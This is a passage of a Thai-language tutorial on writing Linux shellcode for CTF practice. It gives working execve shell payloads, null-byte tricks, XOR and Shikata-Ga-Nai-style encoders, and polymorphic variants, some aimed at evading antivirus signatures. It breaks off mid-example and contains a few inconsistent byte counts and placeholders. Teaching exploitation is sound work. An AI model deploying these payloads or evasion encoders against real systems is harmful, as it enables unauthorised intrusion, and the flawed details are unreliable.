# Part 074: Shellcode Writing (Educational/CTF)

> **คำเตือน**: เนื้อหานี้มีไว้เพื่อการศึกษาและการแข่งขัน CTF เท่านั้น
> การนำไปใช้โจมตีระบบที่ไม่ได้รับอนุญาตถือเป็นความผิดทางกฎหมาย

---

## สารบัญ

1. [บทนำ: Shellcode คืออะไร](#บทนำ)
2. [Shellcode Constraints](#shellcode-constraints)
3. [Execve Shellcode 32-bit](#execve-shellcode-32-bit)
4. [Execve Shellcode 64-bit](#execve-shellcode-64-bit)
5. [Null Byte Elimination Techniques](#null-byte-elimination)
6. [JMP-CALL-POP Technique](#jmp-call-pop)
7. [RIP-Relative Addressing (x64)](#rip-relative-addressing)
8. [XOR Encoder & Decoder Stub](#xor-encoder)
9. [Shikata Ga Nai Style](#shikata-ga-nai)
10. [Polymorphic Shellcode](#polymorphic-shellcode)
11. [Egg Hunter Shellcode](#egg-hunter)
12. [Bind Shell Shellcode](#bind-shell)
13. [Reverse Shell Shellcode](#reverse-shell)
14. [Testing Shellcode with C Harness](#testing-shellcode)
15. [Extracting Bytes: objdump & pwntools](#extracting-bytes)
16. [ARM AArch64 Shellcode](#arm-aarch64)
17. [แบบฝึกหัด CTF](#ctf-exercises)

---

## บทนำ: Shellcode คืออะไร {#บทนำ}

**Shellcode** คือ machine code ขนาดเล็กที่ถูก inject เข้าไปในหน่วยความจำของ process
แล้ว redirect การทำงานไปยัง code นั้น ชื่อ "shellcode" มาจากเป้าหมายดั้งเดิมคือ
การสร้าง shell (`/bin/sh`) แต่ปัจจุบันหมายถึง payload ใดๆ ที่รันได้

### ทำไมต้องเรียน Shellcode?

```
CTF Perspective:
  - pwn challenges ส่วนใหญ่ต้องการ shellcode
  - เข้าใจ binary exploitation อย่างลึกซึ้ง
  - เรียนรู้ system calls โดยตรง
  - เข้าใจ memory layout และ execution model

Security Research Perspective:
  - เข้าใจว่า exploit ทำงานอย่างไร
  - สามารถ analyze malware ได้
  - เข้าใจ mitigations (NX, ASLR, stack canary)
```

### Shellcode Lifecycle

```
1. เขียน Assembly Code
        ↓
2. Assemble เป็น Machine Code
        ↓
3. Extract Bytes (opcodes)
        ↓
4. Embed ใน Exploit (C string, Python bytes)
        ↓
5. Inject เข้า Target Process Memory
        ↓
6. Redirect EIP/RIP ไปที่ Shellcode
        ↓
7. Shellcode Execute!
```

---

## Shellcode Constraints {#shellcode-constraints}

เมื่อเขียน shellcode ต้องระวังข้อจำกัดหลายอย่าง:

### 1. No Null Bytes (`\x00`)

```
เหตุผล: string functions เช่น strcpy(), gets(), printf("%s")
จะหยุดเมื่อเจอ null byte

ปัญหา:
  mov eax, 59       ; 0xb8 0x3b 0x00 0x00 0x00  ← มี null bytes!
  
วิธีแก้:
  xor eax, eax      ; 0x31 0xc0
  mov al, 59        ; 0xb0 0x3b
  
หรือ:
  push 59
  pop eax
```

### 2. No Bad Characters

```
แต่ละ vulnerability มี "bad chars" ต่างกัน:

HTTP input:   \x00 \x0a \x0d (null, newline, carriage return)
scanf():      \x00 \x09 \x0a \x0d \x20 (whitespace)
strncpy():    \x00 เท่านั้น
URL encoding: \x00 \x20 \x25 และอื่นๆ

ตัวอย่าง bad chars ทั่วไป:
  \x00  - null terminator
  \x0a  - newline (\n)
  \x0d  - carriage return (\r)
  \x20  - space
  \x09  - tab
  \x0c  - form feed
  \x0b  - vertical tab
```

### 3. Position Independent Code (PIC)

```
ปัญหา: ไม่รู้ว่า shellcode จะอยู่ที่ address ไหนใน memory

วิธีแก้:
  - ใช้ relative addressing แทน absolute
  - ใช้ JMP-CALL-POP technique
  - ใช้ RIP-relative addressing (x64)
  - ไม่ hardcode address ใดๆ
```

### 4. Size Constraints

```
บาง vulnerability มีพื้นที่จำกัด:
  - Stack buffer อาจเล็กมาก (50-200 bytes)
  - บาง challenge กำหนด max size

เทคนิค:
  - ใช้ short opcodes
  - stage payload (เล็กๆ ก่อน แล้วโหลดใหญ่ขึ้น)
  - ลบ nop sled ออก
```

### 5. Executable Memory

```
ต้องการให้ shellcode อยู่ใน executable memory:
  - NX/DEP: stack ไม่ executable
  - ROP: ใช้ gadgets แทน shellcode โดยตรง
  - mmap(): จัดสรร executable memory เอง
  - JIT regions: มักจะ executable
```

---

## Execve Shellcode 32-bit {#execve-shellcode-32-bit}

เป้าหมาย: เรียก `execve("/bin/sh", NULL, NULL)` บน Linux x86

### System Call Convention (32-bit Linux)

```
syscall number: eax
arg1: ebx
arg2: ecx
arg3: edx
arg4: esi
arg5: edi
invoke: int 0x80

execve syscall number: 11 (0x0b)
```

### Version 1: ง่ายที่สุด (มี null bytes)

```nasm
; shellcode_execve_32_simple.asm
; WARNING: มี null bytes - ใช้เพื่อการเรียนรู้เท่านั้น

section .text
    global _start

_start:
    ; eax = 11 (execve syscall)
    mov eax, 11             ; 0xb8 0x0b 0x00 0x00 0x00 ← null bytes!
    
    ; ebx = pointer to "/bin/sh"
    push 0x00000000         ; null terminator ← null bytes!
    push 0x68732f2f         ; "//sh"
    push 0x6e69622f         ; "/bin"
    mov ebx, esp            ; ebx points to "/bin//sh"
    
    ; ecx = NULL (argv)
    mov ecx, 0              ; ← null bytes!
    
    ; edx = NULL (envp)  
    mov edx, 0              ; ← null bytes!
    
    int 0x80                ; syscall
```

### Version 2: ไม่มี Null Bytes

```nasm
; shellcode_execve_32_nonull.asm
; Position-independent, no null bytes

section .text
    global _start

_start:
    ; clear registers ด้วย XOR
    xor eax, eax            ; eax = 0  (0x31 0xc0 - no nulls!)
    xor ecx, ecx            ; ecx = 0  (0x31 0xc9)
    xor edx, edx            ; edx = 0  (0x31 0xd2)
    
    ; push "/bin//sh" onto stack (reverse order)
    ; "/bin//sh" = 0x2f62696e 0x2f2f7368
    ; push ทีละ 4 bytes จากท้ายก่อน
    push ecx                ; null terminator (ecx=0)
    push 0x68732f2f         ; "//sh" (little-endian: h s / /)
    push 0x6e69622f         ; "/bin" (little-endian: n i b /)
    
    ; ebx = pointer to string บน stack
    mov ebx, esp
    
    ; push argv array: [pointer_to_string, NULL]
    push ecx                ; NULL (argv[1] = NULL)
    push ebx                ; pointer to "/bin//sh" (argv[0])
    mov ecx, esp            ; ecx = argv array
    
    ; eax = 11 (execve)
    mov al, 0x0b            ; 0xb0 0x0b - ใช้ al แทน eax!
    
    ; เรียก syscall
    int 0x80
    
    ; ถ้า execve ล้มเหลว เรียก exit
    xor eax, eax
    mov al, 1
    int 0x80
```

### การ Assemble และ Extract Bytes

```bash
# Assemble
nasm -f elf32 shellcode_execve_32_nonull.asm -o shellcode.o

# Link
ld -m elf_i386 shellcode.o -o shellcode

# ดู opcodes
objdump -d shellcode -M intel

# Extract bytes
objdump -d shellcode | grep -oP '(?<=:\t)([0-9a-f]{2} )+' | tr -d ' \n'
```

Output ที่คาดหวัง:
```
31 c0 31 c9 31 d2 51 68 2f 2f 73 68 68 2f 62 69
6e 89 e3 51 53 89 e1 b0 0b cd 80 31 c0 b0 01 cd 80
```

ตรวจสอบ null bytes:
```bash
# ไม่ควรมี \x00
echo -n "\x31\xc0..." | xxd | grep "00"
```

### Version 3: Shortest Possible (20 bytes)

```nasm
; shellcode_execve_32_short.asm
; 20 bytes, no null bytes

global _start
_start:
    xor eax, eax        ; 2 bytes
    push eax            ; 1 byte  - null terminator
    push 0x68732f2f     ; 5 bytes - "//sh"
    push 0x6e69622f     ; 5 bytes - "/bin"
    mov ebx, esp        ; 2 bytes
    push eax            ; 1 byte  - NULL for argv
    push ebx            ; 1 byte
    mov ecx, esp        ; 2 bytes
    mov al, 0x0b        ; 2 bytes
    int 0x80            ; 2 bytes
; Total: 23 bytes (รวม exit)
```

### ทดสอบด้วย C Harness (32-bit)

```c
// test_shellcode_32.c
#include <stdio.h>
#include <string.h>

char shellcode[] = 
    "\x31\xc0"          // xor eax, eax
    "\x31\xc9"          // xor ecx, ecx
    "\x31\xd2"          // xor edx, edx
    "\x51"              // push ecx
    "\x68\x2f\x2f\x73\x68"  // push "//sh"
    "\x68\x2f\x62\x69\x6e"  // push "/bin"
    "\x89\xe3"          // mov ebx, esp
    "\x51"              // push ecx
    "\x53"              // push ebx
    "\x89\xe1"          // mov ecx, esp
    "\xb0\x0b"          // mov al, 0x0b
    "\xcd\x80";         // int 0x80

int main() {
    printf("Shellcode length: %zu bytes\n", strlen(shellcode));
    printf("Testing shellcode...\n");
    
    // Cast shellcode buffer เป็น function pointer และเรียก
    ((void(*)())shellcode)();
    
    return 0;
}
```

```bash
# Compile แบบ 32-bit พร้อม executable stack
gcc -m32 -z execstack -fno-stack-protector \
    -o test_shellcode_32 test_shellcode_32.c
./test_shellcode_32
# ควรได้ shell!
```

---

## Execve Shellcode 64-bit {#execve-shellcode-64-bit}

### System Call Convention (64-bit Linux)

```
syscall number: rax
arg1: rdi
arg2: rsi
arg3: rdx
arg4: r10
arg5: r8
arg6: r9
invoke: syscall (instruction)

execve syscall number: 59 (0x3b)
```

### Version 1: พื้นฐาน

```nasm
; shellcode_execve_64.asm
; Linux x86-64 execve("/bin/sh", NULL, NULL)

section .text
    global _start

_start:
    ; clear registers
    xor rax, rax            ; rax = 0
    
    ; push "/bin/sh\0" onto stack
    ; "/bin/sh" = 0x2f62696e2f736800 (little-endian, พร้อม null)
    ; แต่ null byte ท้ายทำให้มีปัญหา ใช้ "/bin//sh" แทน
    
    ; push 8 bytes ทีเดียว (64-bit register)
    mov rbx, 0x68732f2f6e69622f  ; "/bin//sh"
    push rbx
    mov rdi, rsp                  ; rdi = pointer to "/bin//sh"
    
    ; รsi = NULL (argv)
    xor rsi, rsi
    
    ; rdx = NULL (envp)
    xor rdx, rdx
    
    ; rax = 59 (execve)
    mov al, 59                    ; mov al ไม่มี null bytes
    
    syscall
```

### Version 2: ไม่มี Null Bytes (สมบูรณ์)

```nasm
; shellcode_execve_64_nonull.asm
; No null bytes, position independent

bits 64

global _start

_start:
    ; === Setup string "/bin/sh" ===
    ; ปัญหา: "/bin/sh\0" มี null byte ท้าย
    ; วิธีแก้: push "/bin//sh" (8 chars พอดี ไม่ต้องมี null)
    ;          แล้วใช้ trick ทำให้ string null-terminated
    
    xor rax, rax                ; rax = 0
    
    ; "/bin//sh" ใน hex:
    ; / = 0x2f, b = 0x62, i = 0x69, n = 0x6e
    ; / = 0x2f, / = 0x2f, s = 0x73, h = 0x68
    ; little-endian: 0x68732f2f6e69622f
    
    push rax                    ; push 0 (null terminator อยู่บน stack)
    
    ; push "/bin//sh"
    mov rbx, 0x68732f2f6e69622f
    push rbx
    
    mov rdi, rsp                ; rdi = "/bin//sh\0"
    
    ; === Setup argv = ["/bin//sh", NULL] ===
    push rax                    ; push NULL
    push rdi                    ; push pointer to string
    mov rsi, rsp                ; rsi = argv
    
    ; === Setup envp = NULL ===
    xor rdx, rdx                ; rdx = NULL
    
    ; === execve syscall ===
    mov al, 59                  ; syscall number 59
    syscall
    
    ; fallback exit
    xor rdi, rdi
    mov al, 60                  ; sys_exit
    syscall
```

### Version 3: แบบสั้น (28 bytes)

```nasm
; shellcode_execve_64_short.asm
; 28 bytes

bits 64
global _start

_start:
    ; xor rax, rax (จริงๆ ใช้ 32-bit ให้สั้นกว่า)
    xor eax, eax            ; 2 bytes (zero-extends ถึง rax)
    
    push rax                ; 1 byte - null terminator
    
    ; move "/bin//sh" เป็น immediate
    mov rbx, 0x68732f2f6e69622f  ; 10 bytes
    push rbx                ; 1 byte
    
    push rsp                ; 1 byte
    pop rdi                 ; 1 byte  (rdi = pointer to string)
    
    push rax                ; 1 byte  (NULL)
    push rdi                ; 1 byte  (pointer)
    push rsp                ; 1 byte
    pop rsi                 ; 1 byte  (rsi = argv)
    
    cdq                     ; 2 bytes (sign-extend eax into edx, rdx=0)
    
    mov al, 59              ; 2 bytes
    syscall                 ; 2 bytes
; Total: ~27-28 bytes
```

### ตรวจสอบ Null Bytes

```python
#!/usr/bin/env python3
# check_null_bytes.py

shellcode = (
    b"\x48\x31\xc0"          # xor rax, rax
    b"\x50"                   # push rax
    b"\x48\xbb\x2f\x62\x69"  # mov rbx, "/bin//sh"
    b"\x6e\x2f\x2f\x73\x68"
    b"\x53"                   # push rbx
    b"\x48\x89\xe7"           # mov rdi, rsp
    b"\x50"                   # push rax
    b"\x57"                   # push rdi
    b"\x48\x89\xe6"           # mov rsi, rsp
    b"\x48\x31\xd2"           # xor rdx, rdx
    b"\xb0\x3b"               # mov al, 59
    b"\x0f\x05"               # syscall
)

print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Shellcode hex: {shellcode.hex()}")

# ตรวจสอบ null bytes
if b'\x00' in shellcode:
    positions = [i for i, b in enumerate(shellcode) if b == 0]
    print(f"WARNING: Null bytes at positions: {positions}")
else:
    print("OK: No null bytes found!")

# แสดง formatted
for i, byte in enumerate(shellcode):
    print(f"  [{i:3d}] 0x{byte:02x}  ", end="")
    if (i+1) % 8 == 0:
        print()
```

---

## Null Byte Elimination Techniques {#null-byte-elimination}

### เทคนิคที่ 1: ใช้ Sub-registers

```nasm
; ปัญหา: mov eax, 0x3b → B8 3B 00 00 00 (มี nulls)
; แก้ด้วย:

; วิธีที่ 1: ใช้ 8-bit register
xor eax, eax    ; clear eax
mov al, 0x3b    ; ใช้ al (low byte) → B0 3B (ไม่มี null!)

; วิธีที่ 2: ใช้ 16-bit register
xor eax, eax
mov ax, 0x3b    ; ใช้ ax → 66 B8 3B 00 (ยังมี null ใน word!)

; วิธีที่ 3: push/pop
push 0x3b       ; 6A 3B (sign-extended, ไม่มี null ถ้า value < 0x7f)
pop eax

; วิธีที่ 4: XOR กับค่าที่รู้
mov eax, 0x3b404040  ; ไม่มี null
xor eax, 0x40404040  ; eax = 0x3b (กำจัด upper bytes)
```

### เทคนิคที่ 2: XOR Trick สำหรับ Zero

```nasm
; ต้องการ register = 0 โดยไม่ใช้ mov reg, 0

xor eax, eax        ; eax = 0
xor rax, rax        ; rax = 0 (64-bit)

; หรือ
sub eax, eax        ; eax = 0

; หรือ cdq
xor eax, eax
cdq                 ; edx = sign_extend(eax) = 0

; หรือ mul
xor eax, eax
mul eax             ; edx:eax = eax*eax = 0
```

### เทคนิคที่ 3: String ไม่มี Null

```nasm
; ปัญหา: "/bin/sh" ต้องการ null terminator \x00

; วิธีที่ 1: "/bin//sh" (8 chars พอดี)
; push ก่อน null บน stack แล้วค่อย push string
push 0              ; null terminator
push "/bin//sh"     ; 8 bytes

; วิธีที่ 2: self-modifying
; ใช้ JMP-CALL-POP แล้วเขียน null ลงไปเอง

; วิธีที่ 3: XOR กับ placeholder
; ใส่ตัวอักษร A แทน null แล้ว XOR ออกตอน runtime
```

### เทคนิคที่ 4: Arithmetic ไม่มี Null

```nasm
; ต้องการ immediate value ที่มี null byte

; เช่น 0x00000010 = 16
; mov eax, 16 → B8 10 00 00 00 (มี null!)

; วิธีแก้: arithmetic
xor eax, eax
add al, 0x10        ; eax = 0x10

; หรือ
push 0x10101010     ; ไม่มี null
pop eax
sub eax, 0x10101000 ; eax = 0x10

; หรือ neg
xor eax, eax
sub eax, -16        ; eax = 16 (แต่ 0xfffffff0 ≠ 16)
neg eax             ; ต้องระวัง
```

### เทคนิคที่ 5: ตรวจสอบ Automatically

```python
#!/usr/bin/env python3
# null_byte_finder.py

import subprocess
import re

def check_shellcode(filename):
    """ตรวจสอบ null bytes ใน shellcode"""
    
    # แปลง asm เป็น object file
    result = subprocess.run(
        ['objdump', '-d', '-M', 'intel', filename],
        capture_output=True, text=True
    )
    
    # Extract hex bytes
    hex_bytes = []
    for line in result.stdout.split('\n'):
        match = re.search(r':\s+([0-9a-f ]+)\s+', line)
        if match:
            bytes_str = match.group(1).strip()
            hex_bytes.extend(bytes_str.split())
    
    print(f"Total bytes: {len(hex_bytes)}")
    
    null_positions = []
    for i, byte in enumerate(hex_bytes):
        if byte == '00':
            null_positions.append(i)
    
    if null_positions:
        print(f"NULL BYTES found at positions: {null_positions}")
        return False
    else:
        print("Clean! No null bytes.")
        return True

# ใช้งาน
check_shellcode('shellcode.o')
```

---

## JMP-CALL-POP Technique {#jmp-call-pop}

เทคนิคนี้ใช้เพื่อได้ address ของ string/data ใน position-independent shellcode

### หลักการทำงาน

```
1. JMP → ข้ามไปที่ CALL
2. CALL → push address ของ instruction ถัดไปลง stack
            แล้ว jump ไปที่ POP
3. POP → เอา address ที่ถูก push ออกมา
   ตอนนี้ register มี address ของ data!
```

### ตัวอย่าง 32-bit

```nasm
; jmp_call_pop_32.asm
; เข้าถึง string "/bin/sh" โดย position independent

section .text
    global _start

_start:
    jmp short get_string    ; 2 bytes: ข้ามไปที่ call

shellcode:
    ; ณ จุดนี้ esi มี address ของ string
    pop esi                 ; esi = address of "/bin/sh"
    
    ; แก้ไข null terminator (ใส่ null byte ตำแหน่งสุดท้าย)
    xor eax, eax
    mov byte [esi + 7], al  ; null terminate "/bin/sh"
    
    ; setup execve
    mov ebx, esi            ; ebx = "/bin/sh"
    mov [esi + 8], ebx      ; argv[0] = pointer to string
    mov [esi + 12], eax     ; argv[1] = NULL
    lea ecx, [esi + 8]      ; ecx = argv array
    xor edx, edx            ; edx = NULL (envp)
    mov al, 11              ; execve syscall (32-bit)
    int 0x80

get_string:
    call shellcode          ; push return address (= address of string!)
    db "/bin/shX"           ; "X" จะถูกแทนด้วย null byte
    ; ต่อจากนี้: argv array (2 dwords = 8 bytes)
    db 0x41, 0x41, 0x41, 0x41  ; placeholder argv[0]
    db 0x42, 0x42, 0x42, 0x42  ; placeholder argv[1]
```

### ตัวอย่าง 64-bit

```nasm
; jmp_call_pop_64.asm

bits 64
global _start

_start:
    jmp short get_str

shellcode:
    pop rdi                 ; rdi = address of "/bin//sh\0"
    
    ; ตรง "/bin//sh" ต่อด้วย null byte แล้ว
    ; (เพราะเราใส่ db 0 ไว้)
    
    xor rsi, rsi            ; argv = NULL
    xor rdx, rdx            ; envp = NULL
    xor rax, rax
    mov al, 59              ; execve
    syscall

get_str:
    call shellcode
    db "/bin//sh", 0        ; string พร้อม null terminator
```

### ข้อดีและข้อเสีย

```
ข้อดี:
  + ง่ายต่อการเข้าถึง string data
  + Position independent โดยสมบูรณ์
  + เหมาะกับ shellcode ที่มี strings หลายตัว

ข้อเสีย:
  - db 0 คือ null byte → ถ้ามี bad char constraint จะมีปัญหา
  - ต้องจัดการ data อย่างระมัดระวัง
  - บาง AV detect pattern นี้ได้

วิธีแก้ null byte ใน data:
  - ใช้ XOR กับ placeholder แทน null
  - decode เองตอน runtime
```

---

## RIP-Relative Addressing (x64) {#rip-relative-addressing}

เทคนิคที่ elegant กว่า JMP-CALL-POP สำหรับ 64-bit

### หลักการ

```
ใน x86-64 สามารถใช้ LEA rXX, [rip + offset] เพื่อได้ address แบบ relative
RIP คือ instruction pointer (program counter)
offset คำนวณ ณ assemble time
```

### ตัวอย่าง

```nasm
; rip_relative_64.asm

bits 64
global _start

_start:
    ; ได้ address ของ string โดย RIP-relative
    lea rdi, [rel string]   ; rdi = address of string
    
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    mov al, 59
    syscall

string:
    db "/bin//sh", 0

; NOTE: [rel label] บอก NASM ให้ใช้ RIP-relative
; encode เป็น: 48 8d 3d XX XX XX XX
; ไม่มี null bytes ถ้า offset ไม่ใหญ่มาก
```

### Disassembly ของ RIP-relative

```
0000000000000000 <_start>:
   0: 48 8d 3d 11 00 00 00    lea    rdi,[rip+0x11]  ; rip + 0x11 = address ของ string
   7: 48 31 f6                xor    rsi,rsi
   a: 48 31 d2                xor    rdx,rdx
   d: 48 31 c0                xor    rax,rax
  10: b0 3b                   mov    al,0x3b
  12: 0f 05                   syscall
0000000000000014 <string>:
  14: 2f 62 69 6e 2f 2f 73 68 00    "/bin//sh"...
```

### ข้อสังเกต

```
48 8d 3d 11 00 00 00  ← offset = 0x11 = 17
                          มี null bytes ใน offset!

ถ้า offset เป็น null byte เป็นปัญหา
แก้ด้วย:
1. จัด layout ให้ offset ไม่มี null (ยาก)
2. ใช้ large negative offset:
   lea rdi, [rip - offset]  ← negative จะ sign-extend เป็น 0xff...
3. XOR decode approach
```

### แก้ปัญหา Null ใน RIP-relative Offset

```nasm
; rip_relative_nonull.asm
; เทคนิค: วาง string ก่อน code

bits 64
global _start

; วาง string ไว้ก่อน
; แต่จะ execute ก่อน ต้องข้ามด้วย jmp

_start:
    jmp short code

string:
    db "/bin//sh", 0

code:
    ; ตอนนี้ string อยู่ "ก่อน" code ใน memory
    ; RIP อยู่ที่ code, string อยู่ที่ negative offset
    lea rdi, [rip - 10]     ; ปรับ offset ตามความเป็นจริง
    
    xor rsi, rsi
    xor rdx, rdx
    xor eax, eax
    mov al, 59
    syscall
```

---

## XOR Encoder & Decoder Stub {#xor-encoder}

การ encode shellcode เพื่อหลีกเลี่ยง bad characters หรือ signature detection

### XOR Encoder (Python)

```python
#!/usr/bin/env python3
# xor_encoder.py
# Encode shellcode ด้วย single-byte XOR key

def xor_encode(shellcode: bytes, key: int) -> bytes:
    """Encode shellcode ด้วย XOR key"""
    encoded = bytes([b ^ key for b in shellcode])
    return encoded

def check_bad_chars(data: bytes, bad_chars: bytes) -> list:
    """หา bad chars ใน data"""
    found = []
    for i, b in enumerate(data):
        if bytes([b]) in [bytes([bc]) for bc in bad_chars]:
            found.append((i, b))
    return found

def find_good_key(shellcode: bytes, bad_chars: bytes) -> int:
    """หา XOR key ที่ทำให้ไม่มี bad chars"""
    for key in range(1, 256):
        encoded = xor_encode(shellcode, key)
        bad = check_bad_chars(encoded, bad_chars)
        # ตรวจสอบ key เองด้วย
        if bytes([key]) not in [bytes([bc]) for bc in bad_chars]:
            if not bad:
                return key
    return -1  # ไม่พบ

# ตัวอย่าง shellcode (execve 64-bit)
original_shellcode = bytes([
    0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x2f, 0x62,
    0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x53, 0x48,
    0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
    0x31, 0xd2, 0xb0, 0x3b, 0x0f, 0x05
])

# Bad chars สำหรับ HTTP
bad_chars = b'\x00\x0a\x0d\x20'

# หา key
key = find_good_key(original_shellcode, bad_chars)
if key == -1:
    print("No single-byte XOR key works!")
else:
    encoded = xor_encode(original_shellcode, key)
    print(f"XOR key: 0x{key:02x}")
    print(f"Original: {original_shellcode.hex()}")
    print(f"Encoded:  {encoded.hex()}")
    
    # สร้าง C format
    print("\nC format:")
    print(f'char key = 0x{key:02x};')
    print('char encoded_shellcode[] = {')
    for i, b in enumerate(encoded):
        if i % 8 == 0:
            print('    ', end='')
        print(f'0x{b:02x}', end='')
        if i < len(encoded) - 1:
            print(', ', end='')
        if (i+1) % 8 == 0:
            print()
    print('\n};')
```

### XOR Decoder Stub (32-bit)

```nasm
; xor_decoder_32.asm
; Decode XOR-encoded shellcode แล้ว execute

; สมมติ key = 0x41, encoded shellcode ต่อท้าย

section .text
global _start

_start:
    ; === Decoder Stub ===
    jmp short get_shellcode

decoder:
    pop esi                 ; esi = address ของ encoded shellcode
    xor ecx, ecx
    mov cl, SHELLCODE_LEN   ; จำนวน bytes (ต้องไม่มี null!)

decode_loop:
    xor byte [esi], 0x41    ; XOR แต่ละ byte กับ key (0x41 = 'A')
    inc esi
    loop decode_loop

    ; === Execute decoded shellcode ===
    jmp short execute

get_shellcode:
    call decoder            ; push address ของ encoded_shellcode
    
; === Encoded shellcode ต่อที่นี่ ===
; ต้องแทนที่ด้วย encoded bytes จริงๆ
encoded_shellcode:
    db 0x79, 0x70, 0x83     ; ตัวอย่าง (decoded จะเป็น execve)
    ; ... rest of encoded shellcode

SHELLCODE_LEN equ $ - encoded_shellcode

execute:
    jmp encoded_shellcode   ; ตอนนี้ decoded แล้ว
```

### XOR Decoder Stub (64-bit)

```nasm
; xor_decoder_64.asm

bits 64
global _start

_start:
    jmp short get_sc

decoder:
    pop rsi                 ; rsi = address ของ encoded shellcode
    xor rcx, rcx
    mov cl, shellcode_len   ; length

.loop:
    xor byte [rsi + rcx - 1], 0x41  ; XOR decode
    loop .loop
    
    ; jump ไปที่ shellcode (ตอนนี้ decoded)
    jmp rsi

get_sc:
    call decoder
encoded_shellcode:
    ; ใส่ encoded bytes ที่นี่
    db 0x09, 0x70, 0x83, ...  ; XOR ด้วย 0x41

shellcode_len equ $ - encoded_shellcode
```

### Multi-byte XOR (Rolling XOR)

```python
#!/usr/bin/env python3
# rolling_xor_encoder.py
# ใช้ key หลาย bytes (หมุนเวียน)

def rolling_xor_encode(shellcode: bytes, key: bytes) -> bytes:
    encoded = []
    for i, b in enumerate(shellcode):
        encoded.append(b ^ key[i % len(key)])
    return bytes(encoded)

# Key 4 bytes
key = b'\x41\x42\x43\x44'
shellcode = bytes([0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb])

encoded = rolling_xor_encode(shellcode, key)
print(f"Encoded: {encoded.hex()}")

# Decode stub จะต้อง loop ผ่าน key bytes
```

---

## Shikata Ga Nai Style {#shikata-ga-nai}

Shikata Ga Nai (仕方がない - "it cannot be helped") เป็น polymorphic XOR additive feedback encoder
จาก Metasploit Framework มีชื่อเสียงในวงการ

### หลักการทำงาน

```
1. เริ่มต้นด้วย random key (seed)
2. แต่ละ block: 
   key = key + encoded[i]  ← feedback (ทำให้ signature ต่างกันทุกครั้ง)
   decoded[i] = key XOR encoded[i]
3. Decoder stub เองก็ถูก encode บางส่วน
   (เรียกว่า "self-modifying" - ต้อง decode stub ก่อน)
```

### Simplified SGN Encoder (Python)

```python
#!/usr/bin/env python3
# sgn_style_encoder.py
# Simplified Shikata Ga Nai style (for educational purposes)

import struct
import random

def sgn_encode(shellcode: bytes, key: int = None) -> tuple:
    """
    Encode shellcode ด้วย additive feedback XOR
    Returns: (encoded_shellcode, key, decoder_stub)
    """
    if key is None:
        key = random.randint(1, 0xffffffff)
    
    # Encode แบบ 4-byte blocks
    encoded = []
    current_key = key
    
    # pad ให้ครบ 4 bytes
    padded = shellcode
    while len(padded) % 4 != 0:
        padded += b'\x90'  # NOP padding
    
    # Encode
    for i in range(0, len(padded), 4):
        block = struct.unpack('<I', padded[i:i+4])[0]
        # XOR กับ key
        encoded_block = block ^ current_key
        # อัพเดต key (additive feedback)
        current_key = (current_key + block) & 0xffffffff
        encoded.append(encoded_block)
    
    encoded_bytes = b''.join(struct.pack('<I', e) for e in encoded)
    
    return encoded_bytes, key, len(encoded)

def create_decoder_stub_x86(key: int, block_count: int) -> bytes:
    """
    สร้าง decoder stub สำหรับ x86
    """
    # สร้าง assembly โดย hand
    # นี่เป็น simplified version
    
    key_bytes = struct.pack('<I', key)
    
    # Stub assembly (pseudo):
    # fnstenv  [esp-12]      ; get EIP via FPU trick
    # pop      esi           ; esi = eip
    # add      esi, offset   ; esi = start of encoded shellcode
    # mov      ecx, block_count
    # mov      edx, key
    # loop:
    # xor      [esi], edx
    # add      edx, [esi]    ; ← additive feedback
    # add      esi, 4
    # loop     loop
    
    print(f"Key: 0x{key:08x}")
    print(f"Blocks: {block_count}")
    print("(Decoder stub generation - simplified)")
    
    return b""  # return actual stub bytes here

# ตัวอย่างการใช้
shellcode = bytes([
    0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68,
    0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50,
    0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80
])

encoded, key, blocks = sgn_encode(shellcode)
print(f"Original:  {shellcode.hex()}")
print(f"Encoded:   {encoded.hex()}")
print(f"Key:       0x{key:08x}")
print(f"Blocks:    {blocks}")
```

### ทำไม SGN ถึง Polymorphic?

```
แต่ละครั้งที่ encode ใช้ random key ต่างกัน
→ encoded bytes ต่างกันทุกครั้ง
→ signature-based detection ไม่ได้ผล

แต่ decoder stub มีโครงสร้างคล้ายกัน
→ AV ที่ฉลาดพอยัง detect decoder pattern ได้
→ ต้องใช้ร่วมกับ anti-emulation techniques
```

---

## Polymorphic Shellcode {#polymorphic-shellcode}

Polymorphic shellcode เปลี่ยน "รูปร่าง" แต่ทำงานเหมือนเดิม

### เทคนิค Polymorphism

```
1. Instruction Substitution
   - mov eax, 0  →  xor eax, eax  →  sub eax, eax
   - add eax, 1  →  inc eax
   
2. Instruction Reordering
   - คำสั่งที่ไม่ขึ้นต่อกันสลับที่ได้
   
3. Junk Insertion
   - ใส่ NOP หรือ dead code ที่ไม่มีผล
   
4. Register Substitution
   - ใช้ register อื่น (ถ้ายังว่าง)
   
5. Code Transposition
   - ย้าย blocks ของ code แล้วใช้ JMP เชื่อม
```

### ตัวอย่าง: Execve Shellcode หลายรูปแบบ

```nasm
; === Version A: Original ===
version_a:
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80

; === Version B: Instruction substitution ===
version_b:
    sub eax, eax        ; ← xor → sub
    push eax
    push dword 0x68732f2f
    push dword 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    push byte 11        ; ← mov al → push/pop
    pop eax
    int 0x80

; === Version C: Register substitution ===
version_c:
    xor edi, edi        ; ← ใช้ edi แทน eax ชั่วคราว
    push edi            ; null
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp        ; ebx = string
    push edi            ; null
    push ebx
    mov ecx, esp        ; ecx = argv
    xor eax, eax        ; eax = 0
    mov al, 11
    int 0x80

; === Version D: Junk insertion ===
version_d:
    xor eax, eax
    nop                 ; ← junk
    push eax
    nop                 ; ← junk
    push 0x68732f2f
    push 0x6e69622f
    xchg ebx, esp       ; ← แทน mov ebx, esp
    nop                 ; ← junk
    push eax
    push ebx
